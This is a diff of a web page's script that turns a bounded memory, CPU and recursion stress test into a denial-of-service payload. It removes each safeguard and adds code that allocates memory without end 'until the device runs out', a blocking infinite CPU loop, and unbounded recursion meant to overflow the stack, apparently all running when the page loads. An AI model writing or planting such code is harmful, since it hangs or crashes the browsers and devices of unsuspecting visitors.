@@ -15,42 +15,31 @@
       let memoryTestCount = 0;
 
       function allocateMemory() {
-        if (memoryTestCount < 800000) { // Control the memory allocation size
-          largeArray.push(new Array(1000)); // Allocate smaller chunks
+        while (true) {
+          // Keep allocating memory until the device runs out
+          largeArray.push(new Array(1000)); // Allocate large chunks to consume memory
           memoryTestCount++;
-        } else {
-          console.log("Memory allocation finished.");
         }
       }
 
       allocateMemory();
 
-      // Part 2: Infinite loop (CPU exhaustion with limited impact)
-      console.log("Starting CPU stress (controlled infinite loop)...");
-      let cpuTestInterval;
-      function startInfiniteLoop() {
-        cpuTestInterval = setInterval(() => {
-          // This loop will run indefinitely but in intervals, preventing UI freeze
-          Math.random(); // Just a dummy operation to keep the loop running
-        }, 0);
+      // Part 2: Infinite loop (CPU exhaustion with no break)
+      console.log("Starting CPU stress (infinite loop)...");
+      while (true) {
+        Math.random(); // Keep the CPU busy with a pointless operation
       }
 
-      startInfiniteLoop();
-
-      // Part 3: Recursion (controlled stack overflow)
+      // Part 3: Recursion (deep stack overflow)
       console.log("Starting recursion...");
       let recursionDepth = 0;
 
       function recurse() {
-        if (recursionDepth < 1000) { // Limit recursion depth to avoid stack overflow
-          recursionDepth++;
-          recurse();
-        } else {
-          console.log("Recursion reached safe depth.");
-        }
+        recursionDepth++;
+        recurse(); // Keep calling the function recursively
       }
 
-      recurse();
+      recurse(); // Trigger deep recursion that will eventually overflow the stack
     };
   </script>
 </body>
